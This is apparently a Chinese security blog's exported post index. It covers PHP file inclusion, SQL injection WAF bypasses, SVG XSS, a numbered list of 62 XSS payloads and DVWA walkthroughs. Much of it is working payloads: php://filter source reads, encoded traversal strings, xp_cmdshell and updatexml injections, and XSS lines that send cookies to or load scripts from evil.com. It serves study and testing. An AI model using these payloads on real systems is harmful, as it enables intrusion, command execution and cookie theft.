名为file.zip，如果可以上传zip文件便直接上传，如果不能则将file.zip重命名为file.jpg后上传，其他几种压缩格式也可以这样操作。 PHP://inputallow_url_include = On。 对allow_url_fopen不做要求。 可以访问请求的原始数据，简单来说POST请求下，php://input可以获取到post数据，如果enctype=”multipart/form-data” 的时候 php://input 是无效的。 php://outputphp://output 是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区。 php://filter对allow_url_include 和allow_url_fopen不做要求。 在任意文件读取或者getshell会用到这个伪协议。 http://127.0.0.1/123.php?file=php://filter/read=convert.base64-encode/resource=auth.php 通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码一下就行。虽然不能直接获取到shell等，但能读取敏感文件危害也是挺大的。 http://127.0.0.1/123.php?file=php://filter/convert.base64-encode/resource=auth.php 效果跟前面一样，少了read关键字。在绕过一些waf时也许有用。 php://filter类似于readfile()、file()、file_get_contents(),在数据流内容读取之前没有机会应用其他过滤器。 在include函数使用上，经常会造成任意文件读取漏洞，而file_get_contents()和file_put_contents()这样函数下，常常会构成getshell等更严重的漏洞。 php://filter 目标使用以下的参数作为它路径的一部分: resource=&lt;要过滤的数据流&gt; 这个参数是必须的。它指定了你要筛选过滤的数据流。 read=&lt;读链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。 write=&lt;写链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。 目录遍历现在在C:\phpStudy\PHPTutorial\phpinfo.txt文件中有php代码&lt;?php phpinfo();?&gt;，则利用../可以进行目录遍历。 http://127.0.0.1/123.php?file=../phpinfo.txt 实际拼接路径为：C:\phpStudy\PHPTutorial\WWW..\phpinfo.txt即C:\phpStudy\PHPTutorial\phpinfo.txt 编码绕过服务器端常常会对于 ../ 等做一些过滤，可以用一些编码来进行绕过。 利用url编码 ../： %2e%2e%2f ..%2f %2e%2e/ ..\： %2e%2e%5c ..%5c %2e%2e\ 二次编码 ../： %252e%252e%252f ..\： %252e%252e%255c 容器/服务器的编码方式 ../： ..%c0%af %c0%ae%c0%ae/（java中会把”%c0%ae”解析为”\uC0AE”，最后转义为ASCCII字符的”.”（点）） ..\： ..%c1%9c 利用协议测试代码： &lt;?php $file = $_GET[&apos;file&apos;]; include $file.&apos;/test/test.php&apos;; ?&gt; 构造压缩包结构如下： http://127.0.0.1/1.php?file=zip://C:\phpStudy\PHPTutorial\WWW\test.zip%23test http://127.0.0.1/1.php?file=phar://C:\phpStudy\PHPTutorial\WWW\test.zip 利用zip协议，注意要指定绝对路径 则拼接后为：zip://C:\phpStudy\PHPTutorial\WWW\test%23test/test/test.php 变量覆盖$$导致的变量覆盖，举个例子 $key = ‘hello’ $hello = ‘world’ echo $$key 输出world 文件包含修复方案 禁止远程文件包含： allow_url_include=off 配置 open_basedir=指定目录，限制访问区域。 过滤../等特殊符号 修改Apache日志文件的存放地址 开启魔术引号 magic_quotes_qpc=on 尽量不要使用动态变量调用文件，直接写要包含的文件]]></content>
      <categories>
        <category>文件包含</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[SQL的WAF绕过]]></title>
    <url>%2F2018%2F12%2F02%2FSQL%E7%9A%84WAF%E7%BB%95%E8%BF%87%2F</url>
    <content type="text"><![CDATA[WAF主要针对HTTP（S）数据包进行解析从而提取相关的字段。 WAF的功能 审计设备：用来截获所有HTTP数据或者仅仅满足某些规则的会话 访问控制设备：用来控制对Web应用的访问，既包括主动安全模式也包括被动安全模式 架构/网络设计工具：当运行在反向代理模式，他们被用来分配职能，集中控制，虚拟基础结构等。 WEB应用加固工具：这些功能增强被保护Web应用的安全性，它不仅能够屏蔽WEB应用固有弱点，而且能够保护WEB应用编程错误导致的安全隐患。 WAF常见特点 异常检测协议：拒绝不符合HTTP标准的请求 增强的输入验证：代理和服务端的验证，而不只是限于客户端验证 白名单&amp;黑名单：白名单适用于稳定的Web应用，黑名单适合处理已知问题 基于规则和基于异常的保护：基于规则更多的依赖黑名单机制，基于异常更为灵活 状态管理：重点进行会话保护 另还有：Coikies保护、抗入侵规避技术、响应监视和信息泄露保护等 WAF识别扫描器 1) 扫描器指纹(head字段/请求参数值)，以awvs为例，会有很明显的Acunetix在内的标识 2) 单IP+ cookie某时间段内触发规则次数 3) 隐藏的链接标签等(&lt;a&gt;) 4） Cookie植入 5) 验证码验证，扫描器无法自动填充验证码 6) 单IP请求时间段内Webserver返回http状态404比例， 扫描器探测敏 WAF绕过思路根据WAF部署位置，针对WAF、WEB服务器、WEB应用对协议解析、字符解析、文件名解析、编码解析以及SQL语法解析的差异，绕过WAF，将payload送至服务器执行。 大小写绕过这个大家都很熟悉，对于一些太垃圾的WAF效果显著，比如拦截了union，那就使用Union、UnIoN等等绕过。 编码绕过比如WAF检测关键字，那么我们让他检测不到就可以了。比如检测union，那么我们就用%55也就是U的16进制编码来代替U，union写成 %55nION，结合大小写也可以绕过一些WAF，你可以随意替换一个或几个都可以。 也还有大家在Mysql注入中比如表名或是load文件的时候，会把文件名或是表明用16进制编码来绕过WAF都是属于这类。 ####（1）URL编码： 在Chrome中输入一个连接，非保留字的字符浏览器会对其URL编码，如空格变为%20、单引号%27、左括号%28、右括号%29，/为%25。 普通的URL编码可能无法实现绕过，还存在一种情况URL编码只进行了一次过滤，可以用两次编码绕过： ?id=1%252f%252a*/UNION%252f%252a /SELECT————————&gt;经过两次URL解码= ?id=1/**/UNION/* /SELECT ####（2）十六进制编码： /index.php?page_id=-15/*!u%6eion*//*!se%6cect*/ 1,2,3,4，SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61)) 示例代码中，前者是对单个字符十六进制编码，后者则是对整个字符串编码，使用上来说较少见一点 ####（3）Unicode编码： Unicode有所谓的标准编码和非标准编码，假设我们用的utf-8为标准编码，那么西欧语系所使用的就是非标准编码了 常用的几个符号的一些Unicode编码： 单引号: %u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7 空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0 左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8 右括号：%u0029、%uff09、\c0%29、\c0%a9、%e0%80%a9 ?id=10%D6&apos;%20AND%201=2%23 SELECT &apos;Ä&apos;=&apos;A&apos;; #1 一：前者利用宽字节绕过，比如对单引号转义操作变成\’，那么就变成了%D6%5C’，%D6%5C构成了一个宽字节即Unicode字节，单引号可以正常使用 二：示例使用的是两种不同编码的字符的比较，它们比较的结果可能是True或者False，关键在于Unicode编码种类繁多，基于黑名单的过滤器无法处理所以情况，从而实现绕过 三：另外平时听得多一点的可能是utf-7的绕过，还有utf-16、utf-32的绕过，后者从成功的实现对google的绕过 替换关键字这种情况下大小写转化无法绕过，而且正则表达式会替换或删除select、union这些关键字，如果只匹配一次就很容易绕过。 index.php?page_id=-15 UNIunionON SELselectECT 1,2,3,4 建议不要对此抱有太大希望…. 使用注释常见的注释符： // -- /**/ # --+ -- - ; --a （1）普通注释index.php?page_id=-15 %55nION/**/%53ElecT 1,2,3,4&apos;union%a0select pass from users# /**/在构造得查询语句中插入注释，规避对空格的依赖或关键字识别; #、–+用于终结语句的查询 （2）内联注释相比普通注释，内联注释用的更多，它有一个特性/*! */只有MySQL能识别(/*! */表示注释里面的语句会被执行) 实例一： ?page_id=-15 /*!UNION*/ /*!SELECT*/ 1,2,3 实例二： ?page_id=null%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/+1,2,3,4… 两个示例中前者使用内联注释，后者还用到了普通注释。使用注释一个很有用的做法便是对关键字的拆分，要做到这一点当然前提是包括/、*在内的这些字符能正常使用 等价函数与命令有些函数或命令因其关键字被检测出来而无法使用，但是在很多情况下可以使用与之等价或类似的代码替代其使用 ####（1）函数或变量 hex()、bin() ==&gt; ascii() sleep() ==&gt;benchmark() concat_ws()==&gt;group_concat() mid()、substr() ==&gt; substring() @@user ==&gt; user() @@datadir ==&gt; datadir() 比如substr()被过滤了可以用mid()和left()、right()等函数。 substr((select &apos;password&apos;),1,1) = 0x70 strcmp(left(&apos;password&apos;,1), 0x69) = 1 strcmp(left(&apos;password&apos;,1), 0x70) = 0 strcmp(left(&apos;password&apos;,1), 0x71) = -1 ####（2）符号 and和or有可能不能使用，或者可以试下&amp;&amp;和||能不能用；还有=不能使用的情况，可以考虑尝试&lt;、&gt;，因为如果不小于又不大于，那边是等于了。在看一下用得多的空格，可以使用如下符号表示其作用：%20、%09、%0a、%0b、%0c、%0d、/**/ ####（3）生僻函数 MySQL/PostgreSQL支持XML函数： Select UpdateXML(‘&lt;script x=_&gt;&lt;/script&gt; ’,’/script/@x/’,’src=//evil.com’); ?id=1 and 1=(updatexml(1,concat(0x3a,(select user())),1)) SELECT xmlelement(name img,xmlattributes(1as src,&apos;a\l\x65rt(1)&apos;as \117n\x65rror)); //postgresql ?id=1 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1))); MySQL、PostgreSQL、Oracle它们都有许多自己的函数，基于黑名单的filter要想涵盖这么多东西从实际上来说不太可能，而且代价太大，看来黑名单技术到一定程度便遇到了限制。 特殊符号乌云drops上“waf的绕过技巧”一文使用的几个例子： 使用反引号`，例如select `version()`，可以用来绕过空格和正则，特殊情况下还可以将其做注释符用 神奇的-+.，select+id-1+1.from users; +是用于字符串连接的，-和.在此也用于连接，可以逃过空格和关键字过滤 @符号，select@^1.from users; `@用于变量定义如@var_name，一个@表示用户定义，@@`表示系统变量 select-count(id)test from users; //绕过空格限制 部分可能发挥大作用的字符(前文中没怎么说到的): ` ~ ! @ % () [] . - + | %00 关键字拆分： ‘se’+’lec’+’t’ %S%E%L%E%C%T 1 ?id=1;EXEC(‘ma’+&apos;ster..x’+&apos;p_cm’+&apos;dsh’+&apos;ell ”net user”’) !和()： &apos; or --+2=- -!!!&apos;2 id=1+(UnI)(oN)+(SeL)(EcT) 使用这些”特殊符号”实现绕过是一件很细微的事情，一方面各家数据库对有效符号的处理是不一样的，另一方面你得充分了解这些符号的特性和使用方法才能作为绕过手段 HTTP参数控制这里HTTP参数控制除了对查询语句的参数进行篡改，还包括HTTP方法、HTTP头的控制 HPP(HTTP Parameter Polution)（重复参数污染）/?id=1;select+1,2,3+from+users+where+id=1— /?id=1;select+1&amp;id=2,3+from+users+where+id=1— /?id=1/**/union/*&amp;id=*/select/*&amp;id=*/pwd/*&amp;id=*/from/*&amp;id=*/users HPP又称做重复参数污染，最简单的就是?uid=1&amp;uid=2&amp;uid=3，对于这种情况，不同的Web服务器处理方式。 具体WAF如何处理，要看其设置的规则，不过就示例中最后一个来看有较大可能绕过 HPF(HTTP Parameter Fragment)（HTTP分割注入）这种方法是HTTP分割注入，同CRLF有相似之处(使用控制字符%0a、%0d等执行换行) /?a=1+union/*&amp;b=*/select+1,pass/*&amp;c=*/from+users-- select * from table where a=1 union/* and b=*/select 1,pass/* limit */from users— 缓冲区溢出缓冲区溢出用于对付WAF，有不少WAF是C语言写的，而C语言自身没有缓冲区保护机制，因此如果WAF在处理测试向量时超出了其缓冲区长度，就会引发bug从而实现绕过。 ?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 示例0xA*1000指0xA后面”A”重复1000次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里1000只做参考，在某些情况下可能不需要这么长也能溢出。 一些整合绕过的例子：id=1/*!UnIoN*/+SeLeCT+1,2,concat(/*!table_name*/)+FrOM /*!information_schema*/.tables /*!WHERE */+/*!TaBlE_ScHeMa*/+like+database()– - ?id=-725+/*!UNION*/+/*!SELECT*/+1,GrOUp_COnCaT(COLUMN_NAME),3,4,5+FROM+/*!INFORMATION_SCHEM*/.COLUMNS+WHERE+TABLE_NAME=0x41646d696e-- index.php?page_id=-15+and+(select 1)=(Select 0xAA[..(add about 1000 &quot;A&quot;)..])+/*!uNIOn*/+/*!SeLECt*/+1,2,3,4… 单一的技术可能无法绕过过滤机制，但是多种技术的配合使用成功的可能性就会增加不少 过滤掉and和or情况下的盲注假如有这样一个注入点 index.php?uid=123 但是and和or被过滤掉了，我们可以构造一下语句 index.php?uid=strcmp(left((select+hash+from+users+limit+0,1),1),0x42)+123 123的时候页面是正确的，我们现在在盲猜hash的第一位，如果第一位等于0x42也就是B，那么strcmp结果为0，0+123=123，所以页面应该是正确的。否则就说明不是B，就这样猜，不用and和or了。 加括号/?id=1+union+(select+1,2+from+users) 如果上面一条被WAF拦截了，可以试着加一些括号。 /?id=1+union+(select+1,2+from+xxx) /?id=(1)union(select(1),mid(hash,1,32)from(users)) /?id=1+union+(select&apos;1&apos;,concat(login,hash)from+users) /?id=(1)union(((((((select(1),hex(hash)from(users)))))))) /?id=(1)or(0x50=0x50) 修复方案：1、如果可能，采用基于IP的白名单； 2、对各种不能解析的内容，全部禁止访问； 3、解析的协议，要全面； 4、对各种不符合标准模式的访问，禁止； 5、WAF解析方式，与后台的WEB服务器、web应用、数据库的解析方式尽可能一致； 6、关键字的匹配，需要考虑诸多变形情况。]]></content>
      <categories>
        <category>SQL</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[SVG XSS黑魔法]]></title>
    <url>%2F2018%2F12%2F02%2FSVG-XSS%E9%BB%91%E9%AD%94%E6%B3%95%2F</url>
    <content type="text"><![CDATA[先来看两个代码，一个可执行一个不可执行。 可执行： &lt;svg&gt;&lt;script&gt;alert&amp;#40;1)&lt;/script&gt; 不可执行： &lt;script&gt;alert&amp;#40;1)&lt;/script&gt; 那么为啥加了&lt;svg&gt;的可以执行？ 这就得由html解析流程说起了。 html解析到&lt;svg&gt;的时候会变成标签开始状态(Tag open state)，然后到标签名状态(Tag name state)，等等，最终到数据状态(Data state)，并释放当前标签的token，当解析器处于数据状态(Data state)时，它会继续解析，每当发现一个完整的标签，就会释放出一个token。 svg属于外部元素。 外部元素来源于MathML和SVG命名空间。 而MathML（数学标记语言）是一种基于XML的标准。 那么可以猜测&lt;svg&gt;遵循XML和SVG的定义。 在XML中，&amp;#40;会被解析成( 在XML中实体会自动转义,除了&lt;![CDATA[和]]&gt;包含的实体 &lt;xml&gt; &lt;name&gt;aaa&lt;/name&gt; &lt;value&gt;aaaaaaa&amp;#40;&lt;/value&gt; &lt;/xml&gt; 当然，SVG标准中也定义了script标签的存在。 所以，这个XSS之所以能够执行是因为遵循了svg及xml的标准]]></content>
      <categories>
        <category>XSS</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[XSS测试用例]]></title>
    <url>%2F2018%2F12%2F01%2FXSS%E6%B5%8B%E8%AF%95%E7%94%A8%E4%BE%8B%2F</url>
    <content type="text"><![CDATA[1.&lt;script&gt; alert(1);&lt;/script&gt; 2.&lt;script&gt;alert(&#39;xss&#39;);&lt;/script&gt; 3.&lt;script src=&quot;http://www.evil.com/cookie.php&quot;&gt;&lt;/script&gt; 4.&lt;script&gt;location.href=&quot;http://www.evil.com/cookies.php?cookie=&quot;+escape(document.cookie)&quot;&lt;/script&gt; 5.&lt;scr&lt;script&gt;ipt&gt;alert(&#39;xss&#39;);&lt;/scr&lt;/script&gt;ipt&gt; 6.&lt;img src=liu.jpg onerror=alert(/xss/)/&gt; 7.&lt;style&gt;@im\port&#39;\ja\vasc\ript:alert(\&quot;xss\&quot;)&#39;;&lt;/style&gt; 8.&lt;?echo(&#39;&lt;src)&#39;; echo(&#39;ipt&gt;alert(\&quot;xss\&quot;)&#39;;&lt;/script&gt;&#39;);?&gt; 9.&lt;marquee&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&lt;/marquee&gt; 10.&lt;IMG SRC=\&quot;jav&amp;#0x9;ascript:alert(&#39;xss&#39;);\&quot;&gt; 11.&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt; 12.&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt; 13.&lt;script src=http://www.evil.com/files.js&gt;&lt;/script&gt; 14.&lt;/title&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt; 15.&lt;/textarea&gt;&lt;script&gt;alert(/xss)&lt;/script&gt; 16.&lt;IMG LOWSRC=\&quot;javascript:alert(&#39;XSS&#39;)\&quot;&gt; 17.&lt;IMG DYNSRC=\&quot;javascript:alert(&#39;XSS&#39;)\&quot;&gt; 18.&lt;font style=&#39;color:expression(alert(document.cookie))&#39;&gt; 19.&#39;);alert(&#39;XSS 20.&lt;img src=&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt; 21.[url=javascript:alert(&#39;XSS&#39;);]click me[/url] 22.&lt;body onunload=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt; 23.&lt;body onLoad=&quot;alert(&#39;XSS&#39;);&quot; 24.[color=red&#39; onmouseover=&quot;alert(&#39;XSS&#39;)&quot;]mouse over[/color] 25.&quot;/&gt;&lt;/a&gt;&lt;/&gt;&lt;img src=1.gif onerror=alert(1)&gt; 26.window.alert(&quot;XSS&quot;); 27.&lt;div style=&quot;x:expression((window==1)?&quot;:eval(&#39;r=1;alert(String.fromCharCode(83,83,83));&#39;))&quot;&gt; 28.&lt;iframe&lt;?php eval chr(11)?&gt;onload=alert(&#39;XSS&#39;)&gt;&lt;/iframe&gt; 29.&quot;&gt;&lt;script alert(String.fromCharCode(88,83,83))&lt;/script&gt;30.&#39;&gt;&gt;&lt;marquee&gt;&lt;h1&gt;XSS&lt;h1&gt;&lt;/marquee&gt; 31.&#39;&quot;&gt;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt; 32.&#39;&quot;&gt;&gt;&lt;marquee&gt;&lt;h1&gt;XSS&lt;/h1&gt;&lt;/marquee&gt; 33.&lt;META HTTP-EQUIV=\&quot;refresh\&quot; CONTENT=\&quot;0;url=javascript:alert(&#39;XSS&#39;);\&quot;&gt; 34.&lt;META HTTP-EQUIV=\&quot;refresh\&quot;CONTENT=\&quot;0;URL=http://;url=javascript:alert(&#39;XSS&#39;);\&quot;&gt; 35.&lt;script&gt;var var=1; alert(var)&lt;/script&gt; 36.&lt;STYLE type=&quot;text/css&quot;&gt;BODY{background:url(&quot;javascript:alert(&#39;XSS&#39;)&quot;)}&lt;/STYLE&gt; 37.&lt;?=&#39;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&#39;?&gt; 38.&lt;IMG SRC=&#39;vbscript:msgbox(\&quot;XSS\&quot;)&#39;&gt; 39.&quot;onfocus=alert(document.domain)&quot;&gt;&lt;&quot; 40.&lt;FRAMESET&gt;&lt;FRAME SRC=\&quot;javascript:alert(&#39;XSS&#39;);\&quot;&gt;&lt;/FRAMESET&gt; 41.&lt;STYLE&gt;li {list-style-image:url(\&quot;javascript:alert(&#39;XSS&#39;)\&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS 42.&lt;br size=\&quot;&amp;{alert(&#39;xss&#39;)}\&quot;&gt; 43.&lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt; 44.&quot;&gt;&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt; 45.[color=red width=expression(alert(123))][color] 46.&lt;BASE HREF=&quot;javascript:alert(&#39;XSS&#39;);//&quot;&gt; 47.Execute(MsgBox(chr(88)&amp;&amp;chr(83)&amp;&amp;chr(83)))&lt; 48.&quot;&gt;&lt;/iframe&gt;&lt;script&gt;alert(123)&lt;/script&gt; 49.&lt;body onLoad=&quot;while(true) alert(&#39;XSS&#39;);&quot;&gt; 50.&quot;&lt;marquee&gt;&lt;img src=k.png onerror=alert(/xss/) /&gt; 51.&lt;div style=&quot;background:url(&#39;javascript:&#39;) 52.&lt;img src=&#39;java\nscript:alert(\&quot;XSS\&quot;)&#39;&gt; 53.&gt;&#39;&quot;&gt;&lt;img src=&quot;javascript:alert(&#39;xss&#39;)&quot;&gt; 54.&lt;svg&gt;&lt;script&gt;alert&amp;#40/1/&amp;#41&lt;/script&gt; 55.&lt;q/oncut=open()&gt; 56.&lt;q/oncut=alert(1)&gt;//在限制长度的地方很有效 57.&lt;applet code=&quot;javascript:confirm(document.cookie);&quot;&gt; // Firefox有效 58.&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=&quot;&gt; 59.&lt;form action=&quot;Javascript:alert(1)&quot;&gt;&lt;input type=submit&gt; 60.&lt;formaction=&#39;data:text&amp;sol;html,&amp;lt;script&amp;gt;alert(1)&amp;lt/script&amp;gt&#39;&gt;&lt;button&gt;CLICK 61.&lt;iframe/src=&quot;data:text&amp;sol;html;&amp;Tab;base64&amp;NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==&quot;&gt; 62.&lt;body/onhashchange=alert(1)&gt;&lt;a href=#&gt;clickit]]></content>
      <categories>
        <category>XSS</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[XSS绕过及DVWA实例]]></title>
    <url>%2F2018%2F12%2F01%2FXSS%E7%BB%95%E8%BF%87%E5%8F%8ADVWA%E5%AE%9E%E4%BE%8B%2F</url>
    <content type="text"><![CDATA[最基本的用法：&lt;script&gt;alert(&#39;xss&#39;);&lt;/script&gt; 黑名单绕过：大多数的场所是用的黑名单来做过滤器的。 尝试插入比较正常的HTML标签，例如：&lt;b&gt;，&lt;i&gt;，&lt;u&gt;来看一下返回页面的情况是怎样的，是否被HTML编码了，或者标签被过滤了。 尝试插入不闭合的标签，例如：&lt;b，&lt;i，&lt;u，&lt;marquee然后看一下返回响应，是否对开放的标签也有过滤。 大小写及重写的绕过:&lt;SCRIscriptPT&gt;AalLEerRtT(&#39;xss&#39;);&lt;/SCscriptRIPT&gt; 事件绕过：利用JS事件进行相关绕过：&lt;img src=# onerror=alert(&#39;xss&#39;);&gt; 相关JS事件： 编码绕过： 当浏览器接受到一份HTML代码后，会对标签之间（&lt;p&gt;xxx&lt;/p&gt;等，&lt;script&gt;除外)、标签的属性中（&lt;a href=&#39;xxxx&#39;&gt;）进行实体字符解码变为相应的字符，而不会发挥出其本来该有的功能，如：&#60;被解码为&lt;后仅被当作字符，而不会被当成标签名的起始。既然是字符串，那在href=&#39;xx&#39;这些属性值本来就是字符串的地方可以作为一种可能的绕过的手段 例如：&lt;img src=1 onerror=&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&gt; 上述代码解析后为：&lt;img src=1 onerror=alert(1)&gt; ,可以弹窗 在代码被HTML解释器解释后，如果遇到需要填入url的位置，则该位置交由url解释器解释，如果是js代码的(例如onclick=””)，就js解释器解释，但是注意：javascript:不能用url编码代替，因为javascript:为协议类型，若是使用url编码，会被当作普通字符串，后面的js代码也不会被当作js代码解释 &lt;a href=&quot;javascript:%61%6c%65%72%74%28%31%29&quot;&gt;&lt;/a&gt; 被url解释器解释完后为&lt;a href=&quot;javascript:alert(1)&quot;&gt;&lt;/a&gt;，url中出现了javascript:，指明了后面的语句要当作js执行，所以再次把解释后的字符交给js解释器解释，可以弹窗。 当js解释器在标识符名称(例如函数名，属性名等等)中遇到unicode编码会进行解码，并使其标志符照常生效。而在字符串中遇到unicode编码时会进行解码只会被当作字符串。&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(&#39;xss&#39;)&lt;/script&gt; 解码后为&lt;script&gt;alert(1)&lt;/script&gt;,一样可以弹窗。但如果是：&lt;script&gt;document.write(&#39;\u0039\u0041\u0059\u0097\u0108;\u0101\u0114\u0016\u0040\u0039\u0049\u0049\u0049&#39;)&lt;/script&gt; 解码后为 &lt;script&gt;document.write(&#39; &#39;);alert(&#39;111&#39;)&lt;/script&gt;就不要指望他可以弹窗了。因为解码出来的&#39;);alert(&#39;111仍为被当作字符串而不会影响上下文。 利用String.fromCharCode进行编码绕过测试代码： &lt;?php function xss_check($str){ if(preg_match(&apos;/script|alert/i&apos;, $str)) return &apos;error&apos;; else return $str; } @$id = $_GET[&apos;id&apos;]; echo xss_check($id); ?&gt; 屏蔽了alert(也可能是其他的)，此时可以使用编码绕过： &lt;img src=1 onerror=\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074:\u0061\u006c\u0065\u0072\u0074(/xss/);&gt; 将javascript和alert进行unicode编码实现绕过，成功弹窗。 利用String.fromCharCode进行编码绕过:&lt;img src=2 onerror=eval(String.fromCharCode(97,108,101,114,116,40,47,120,115,115,47,41))&gt; 其中String.fromCharCode(97,108,101,114,116,40,47,120,115,115,47,41)是alert(/xss/)编码后的内容，google插件hackbar就有此功能。 GBK宽字节绕过测试代码： &lt;!DOCTYPE html&gt; &lt;meta charset=&quot;gbk&quot;&gt; &lt;?php error_reporting(0); $conn = mysql_connect(&apos;127.0.0.1&apos;,&apos;root&apos;,&apos;root&apos;); mysql_select_db(&apos;test&apos;,$conn); #mysql_query(&quot;set names gbk&quot;); $id = addslashes($_GET[&apos;sql&apos;]); $sql = &quot;SELECT username,password FROM admin WHERE id=&apos;{$id}&apos;&quot;; echo $sql.&apos;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&apos;; if($res = mysql_query($sql)){ while($row = mysql_fetch_array($res)){ var_dump($row); } }else{ echo &quot;Error&quot;.mysql_error().&quot;&lt;/br&gt;&quot;; } ?&gt; 直接‘会被转义，不会被执行。 使用宽字符就可以被成功执行 解析过程 $_GET[‘id’]经过addslashes编码之后带入了‘’ 变成 &lt;pre&gt;2%df%5C%27 and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)%23&lt;/pre&gt; 带入mysql处理时使用了gbk字符集 %df%5c 運成功的吃掉了%5c %27‘单引号成功闭合 GBK编码，编码范围是0x8140~0xFEFE（不包括xx7F），在遇到%df(ascii(223)) &gt;ascii(128)时自动拼接%5c，因此吃掉‘，而%27、%20小于ascii(128)的字符就保留了。 0字节绕过&lt;scri%00pt&gt;alert(1);&lt;/scri%00pt&gt; &lt;scri\x00pt&gt;alert(1);&lt;/scri%00pt&gt; &lt;s%00c%00r%00%00ip%00t&gt;confirm(0);&lt;/s%00c%00r%00%00ip%00t&gt; 在IE9及以下版本成功绕过。 IE6下绕过IE下还可利用javascript:alert(/xss/); 或css body { background:black; xss:expression(alert(/zhuling.wang/));/*IE6下测试*/ } 成功绕过 DVWA测试用例反射性XSS低等级任意XSS都可用 中等级&lt;script &gt;alert(&apos;123&apos;)&lt;/script&gt; &lt;sCript&gt;alert(&apos;123&apos;)&lt;/script&gt; &lt;scri&lt;script&gt;pt&gt;alert(&apos;123&apos;)&lt;/script&gt; &lt;img src=# onerror=alert(1)&gt; &lt;h1 onclick=alert(1)&gt;123&lt;/h1&gt;等等 高等级过滤掉script标签更严格，不能使用script标签 &lt;h1 onclick=alert(1)&gt;123&lt;/h1&gt; &lt;img src=# onerror=alert(1)&gt; 其他html标签构造的事件还是可以使用的。 不可能级别用到了htmlspecialchars()，这个函数是将预定义的字符转换为 HTML 实体。预定义的字符是： &amp; （和号）成为 &amp; “ （双引号）成为 “ ‘ （单引号）成为 ‘ &lt; （小于）成为 &lt; （大于）成为 &gt; 存储型XSS低等级没有过滤直接注入，但是name框有最大长度限制，所以选择在message注入。 &lt;img src=# onerror=alert(1)&gt;等等 中等级因为一上来就给Message添加了htmlspecialchars函数所以不能进行注入，但是name框长度的最大限制是在html设置的，所以可以在审查元素中直接对长度进行修改。或者可以用burp抓包发送。 高等级message还是封死了，还是把script过滤掉了，跟中等级类似，抓包发送等等。 不可能级别这里对name和message都做了htmlspecialchars（）处理。 DOM型XSS低等级直接在网页导航栏构造GET XSS即可完成注入 中等级源码显示会过滤掉script标签，但是直接用&lt;img src=# onerror=alert(1)&gt;没有直接执行，尝试闭合option没有成功,尝试闭合select标签成功执行。 ?#default=&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;也可以。 高等级对传入值进行switch判断 ?default=English #&lt;script&gt;alert(1)&lt;/script&gt; #该字符后的数据不会发送到服务器端，从而绕过服务端过滤。]]></content>
      <categories>
        <category>XSS</category>
      </categories>
  </entry>
</search>
